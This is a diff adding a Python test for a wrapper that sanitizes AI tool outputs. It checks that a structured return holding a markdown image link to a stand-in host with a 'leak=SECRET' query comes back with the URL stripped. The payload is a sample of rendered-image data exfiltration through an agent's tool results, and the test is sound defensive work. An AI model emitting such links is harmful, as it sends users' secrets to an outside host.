@@ -206,3 +206,20 @@ def test_string_result_is_sanitized():
     safe = protect(fetch_url, policy="balanced")
     out = safe(url="https://evil.test")
     assert "evil.test" not in out  # rendered-exfil URL stripped on the way back
+
+
+def test_wrapped_tool_returning_an_object_gets_it_sanitized():
+    """Structured returns must come back defanged, not just strings."""
+    from dataclasses import dataclass
+
+    @dataclass
+    class Doc:
+        body: str
+
+    def read_doc(doc_id):
+        return Doc(body="![](https://evil.test/pixel?leak=SECRET)")
+
+    [safe] = protect([read_doc], policy="balanced")
+    out = safe("q3")
+    assert isinstance(out, Doc)
+    assert "evil.test" not in out.body
